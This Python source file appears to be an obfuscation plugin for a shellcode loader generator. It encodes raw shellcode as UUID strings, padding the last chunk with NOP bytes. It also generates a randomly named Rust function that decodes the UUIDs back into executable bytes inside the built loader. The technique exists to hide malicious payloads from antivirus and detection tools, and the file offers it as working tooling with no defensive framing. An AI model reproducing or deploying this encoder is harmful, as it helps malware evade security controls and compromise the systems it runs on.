import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self):
        return ['extern crate uuid;', 'use uuid::{Uuid};']

    def compilerOptions(self):
        return ['uuid = "1.24.0"']

    def codeblock(self):
        return f"""
fn {self.name}(encoded: &[&str]) -> Vec<u8> {{
    let mut decoded: [u8; {self.size}] = [0; {self.size}];
    for (i, uuidstring) in encoded.iter().enumerate(){{
        let  binaryuuid = Uuid::parse_str(uuidstring);
        for (j, uuidbyte) in binaryuuid.unwrap().as_bytes().iter().enumerate(){{
            if i*16+j >= {self.size}{{
                return decoded.to_vec()
            }}
            decoded[i*16+j] = *uuidbyte;
        }}
    }}
    decoded.to_vec()
}}
"""

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}(&{{shellcode}})')

    def obfuscate(self, decoded):
        encoded = []
        self.size = len(decoded)
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes = chunk)))
        return encoded
